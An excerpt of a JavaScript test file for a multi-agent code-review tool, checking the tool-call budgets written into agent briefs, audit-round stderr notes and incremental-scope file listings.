        expect(writeStderrLineSafe.mock.calls
            .map((c) => String(c[0]))
        ...
        let safe = writeStderrLineSafe.mock.calls
            .map((c) => String(c[0]))
            .join('\n');
        ...
        safe = writeStderrLineSafe.mock.calls
            .map((c) => String(c[0]))
            .join('\n');
        expect(safe).not.toContain('reverse-audit retirement unavailable');
    ...
    it('the #9242 note stays below the convergence gate — a converged round notes nothing', () => {
        ...
        writeFileSync(plan, JSON.stringify({ ...PLAN, srcDiffLines: 100, diffLines: 800 }));
        const old = new Date(2020, 0, 1);
        utimesSync(plan, old, old);
        answerRound(1, { 13: DRY, 14: DRY, 15: DRY });
        answerRound(2, { 13: DRY, 14: DRY, 15: DRY });
    ...
    it('the #9242 note cites the auditors actually scheduled, not every chunk', () => {
        ...
        const out = runRound(3);
        expect(out).toContain('2 auditors required this round');
        const note = writeStderrLine.mock.calls
            .map((c) => String(c[0]))
...
describe('the tool budget in the briefs', () => {
    ...
    const budgetPlan = budgetPlanObj;
    it('scopes a chunk agent to its own territory, not the whole plan', () => {
        ...
        expect(buildChunkAgentPrompt(budgetPlan, 13)).toContain('About **42 tool calls**');
        // Chunk 14's 40,000 chars take two reads to page through: brief + two
        // pages ride on top of its 38-call allowance.
        expect(buildChunkAgentPrompt(budgetPlan, 14)).toContain('About **41 tool calls**');
    });
    ...
    it('gives a whole-diff role the plan allowance plus its reading list', () => {
        ...
        for (const role of ['1a', '2', '6b']) {
            expect(buildRoleBrief(budgetPlan, role)).toContain('About **49 tool calls**');
        }
        ...
        expect(buildRoleBrief(budgetPlan, 'reverse-audit')).toContain('About **52 tool calls**');
    });
    it('a chunk-scoped reverse auditor gets its chunk, not the diff', () => {
        ...
        expect(buildRoleBrief(budgetPlan, 'reverse-audit', { chunk: 13 })).toContain('About **45 tool calls**');
    });
    it('an invariant agent budgets on its file, reads scaled by its size', () => {
        ...
        expect(buildRoleBrief(budgetPlan, 'invariant-a', { file: 'big.ts' })).toContain('About **46 tool calls**');
    });
    it('invariant reads scale with the file, past the floor', () => {
        ...
        expect(buildRoleBrief(big, 'invariant-a', { file: 'huge.ts' })).toContain('About **69 tool calls**');
    });
    it('removed lines are territory too — a gutting rewrite is not 200 lines', () => {
        ...
        expect(buildRoleBrief(gutted, 'invariant-a', { file: 'gut.ts' })).toContain('About **64 tool calls**');
    });
    it('a volume-heavy file budgets its paging from fileLines, not added lines', () => {
        ...
        expect(buildRoleBrief(voluminous, 'invariant-a', { file: 'vol.ts' })).toContain('About **72 tool calls**');
    });
    it('chunk territory is source-weighted, like the plan allowance it mirrors', () => {
        ...
        expect(buildChunkAgentPrompt(mixed, 21)).toContain('About **39 tool calls**');
    });
    it('an Agent 8 specialist is budgeted like any other whole-diff finder', () => {
        ...
        expect(buildWholeDiffBlock(budgetPlan)).toContain('About **48 tool calls**');
    });
    it('budgets every role in BRIEFS except the ones declaring budgetExempt', () => {
        ...
        const roles = Object.keys(BRIEFS);
        const budgeted = Object.fromEntries(roles.map((role) => {
        ...
        expect(budgeted).toEqual(Object.fromEntries(roles.map((role) => [role, !BRIEFS[role].budgetExempt])));
    ...
    ])('a plan whose ceiling is %s is clamped, not obeyed', (_name, value, expected) => {
        const skewed = {
            ...budgetPlanObj,
            budget: { agentToolBudget: value },
        };
        expect(buildRoleBrief(skewed, '1a')).toContain(`About **${expected} tool calls**`);
    });
    ...
    it('a plan without the field falls back to no ceiling — more coverage, never less', () => {
        expect(buildChunkAgentPrompt(PLAN, 13)).not.toContain('Tool budget');
        expect(buildRoleBrief(PLAN, '1a')).not.toContain('Tool budget');
    });
...
describe('--all-chunks topology anomaly note (#9242)', () => {
    ...
    function runAllChunksWith(planPatch) {
    ...
    const stderrLines = () => writeStderrLine.mock.calls.map((call) => String(call[0]));
    function runChunkWith(planPatch) {
...
describe('incremental-scope briefs', () => {
    ...
    it('a chunk-scoped ROLE brief lists its OWN files uncapped', () => {
        ...
        const wide = {
            ...
            incremental: {
                scope: {
                    ...
                    deltaFiles: Array.from({ length: 40 }, (_, i) => `src/d${i}.ts`).concat(['src/changed.ts']),
                    interaction: [
                        { path: 'src/caller.ts', importsChanged: ['src/changed.ts'] },
                    ],
                },
        ...
        expect(buildRoleBrief(wide, 'reverse-audit', { chunk: 1 })).toContain('src/changed.ts — **changed since the last round**');
    });
            ...
            incremental: {
                scope: {
                    ...
                    interaction: [
                        {
                            path: 'src/hub.ts',
                            importsChanged: Array.from({ length: 20 }, (_, i) => `src/d${i}.ts`),
                        },
                    ],
                },
            },
    ...
    it('past the cap, the chunk briefs AND the role brief stay uncapped', () => {
        ...
        expect(roleBrief).toContain('src/d39.ts — **changed since the last round**');
    });
    ...
    it('a chunk whose files carry NO scope class gets no incremental frame', () => {
        ...
        expect(buildChunkAgentPrompt(foreign, 1)).not.toContain('INCREMENTAL round');
    });
    it('whole-diff briefs name each file with its scope class', () => {
        const p = buildRoleBrief(INCREMENTAL_PLAN, '2');
        expect(p).toContain('Changed since the last round (full review): src/changed.ts.');
